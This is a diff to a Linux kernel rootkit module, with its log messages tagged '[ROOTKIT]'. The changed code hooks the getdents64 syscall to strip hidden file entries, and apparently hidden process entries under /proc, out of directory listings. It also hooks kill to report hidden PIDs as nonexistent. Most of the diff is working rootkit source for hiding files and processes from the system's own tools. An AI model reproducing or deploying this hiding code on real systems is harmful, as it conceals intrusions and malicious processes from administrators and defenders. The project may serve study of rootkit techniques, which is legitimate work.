@@ -253,22 +253,26 @@ SYSCALL_HOOK_HANDLER3(getdents, orig_getdents, p_regs, unsigned int, ui32_fd, di
 SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd,
                       dirent64_t __user *, p_dirent, unsigned int, ui32_count)
 {
-    long l_ret_orig          = 0;    // Original return value of the real syscall
-    long l_ret               = 0;    // Return value that will be returned to the caller
-    long l_err               = 0;    // Error code of the copy functions
-    long l_move_len          = 0;    // Length of the data to move
-    unsigned short us_reclen = 0;    // Length of the current directory entry
-    const char *s_pathname   = NULL; // Pathname of the directory
+    long l_ret_orig          = 0;     // Original return value of the real syscall
+    long l_ret               = 0;     // Value that will be returned to the caller
+    long l_err               = 0;     // Error code of the copy functions
+    long l_move_len          = 0;     // Length of the data to move
+    unsigned short us_reclen = 0;     // Length of the current directory entry
+    const char *s_pathname   = NULL;  // Pathname of the directory
+    const file_t *p_file     = NULL;  // File structure of the directory
+    bool b_is_proc_root      = false; // Is the directory /proc/?
 
-    dirent64_t *p_dirent_k    = NULL; // Kernel buffer for directory entry array
-    dirent64_t *p_dirent_k_it = NULL; // Directory entry array iterator
+    dirent64_t *p_dirent_k  = NULL; // Kernel buffer for directory entry array
+    dirent64_t *p_dirent_it = NULL; // Directory entry array iterator
 
     pr_info("[ROOTKIT] getdents64(%u, %p, %u)", ui32_fd, p_dirent, ui32_count);
 
     l_ret_orig = orig_getdents64(p_regs);
     pr_cont(" = %ld\n", l_ret_orig);
 
-    s_pathname = fd_get_pathname(ui32_fd);
+    p_file = fd_get_file(ui32_fd);
+
+    s_pathname = file_get_pathname(p_file);
     IF_U (IS_ERR_OR_NULL(s_pathname)) {
         s_pathname = kstrdup_const("(error)", GFP_KERNEL);
     }
@@ -304,31 +308,40 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
 
     pr_info("[ROOTKIT] * Directory entries:\n");
 
-    p_dirent_k_it = p_dirent_k;
-    l_ret         = l_ret_orig;
+    p_dirent_it = p_dirent_k;
+    l_ret       = l_ret_orig;
 
-    while ((char *)p_dirent_k_it < (char *)p_dirent_k + l_ret && p_dirent_k_it->d_reclen != 0) {
-        pr_info("[ROOTKIT]   * %s\n", p_dirent_k_it->d_name);
+    // Check if the directory is /proc/
+    b_is_proc_root = is_proc_root(p_file);
 
-        us_reclen = p_dirent_k_it->d_reclen;
+    // Loop over the directory entries until the end of the buffer is reached
+    // or the current directory entry is empty
+    while ((char *)p_dirent_it < (char *)p_dirent_k + l_ret && p_dirent_it->d_reclen != 0) {
+        pr_info("[ROOTKIT]   * %s\n", p_dirent_it->d_name);
+
+        us_reclen = p_dirent_it->d_reclen;
 
         // Check if the current directory entry has to be hidden
-        IF_U (!strncmp(p_dirent_k_it->d_name, S_HIDDEN_PREFIX, SZ_HIDDEN_PREFIX_LEN)) {
+        IF_U (is_dirent_hidden(p_dirent_it, b_is_proc_root)) {
             pr_info("[ROOTKIT]     * Hiding directory entry\n");
 
-            IF_L ((char *)p_dirent_k_it + us_reclen < (char *)p_dirent_k + l_ret) {
+            IF_L ((char *)p_dirent_it + us_reclen < (char *)p_dirent_k + l_ret) {
                 // The current directory entry is not the last one,
                 // so we have to move the next entries to the current position
-                l_move_len = l_ret - ((char *)p_dirent_k_it - (char *)p_dirent_k) - us_reclen;
-                memmove(p_dirent_k_it, (char *)p_dirent_k_it + us_reclen, l_move_len);
+
+                // Length of the data to move is equal to the total length of the buffer,
+                // minus the length of what we've already read (iterator pos minus start pos),
+                // minus the length of the current directory entry (which we want to hide)
+                l_move_len = l_ret - ((char *)p_dirent_it - (char *)p_dirent_k) - us_reclen;
+                memmove(p_dirent_it, (char *)p_dirent_it + us_reclen, l_move_len);
             }
 
-            // Decrease the total length
+            // Decrease the total length to account for the hidden directory entry
             l_ret -= us_reclen;
         }
         else {
-            // Update the iterator to the next directory entry
-            p_dirent_k_it = (dirent64_t *)((char *)p_dirent_k_it + us_reclen);
+            // Move the iterator to the next directory entry
+            p_dirent_it = (dirent64_t *)((char *)p_dirent_it + us_reclen);
         }
     }
 
@@ -379,7 +392,7 @@ SYSCALL_HOOK_HANDLER2(kill, orig_kill, p_regs, pid_t, i32_pid, int, i32_sig)
     }
 
     // Check if the process is hidden; if so, return -ESRCH (No such process)
-    IF_U (is_process_hidden(i32_pid)) {
+    IF_U (is_pid_hidden(i32_pid)) {
         pr_info("[ROOTKIT] * Intercepted signal %d for hidden PID %d\n", i32_sig, i32_pid);
         return -ESRCH;
     }
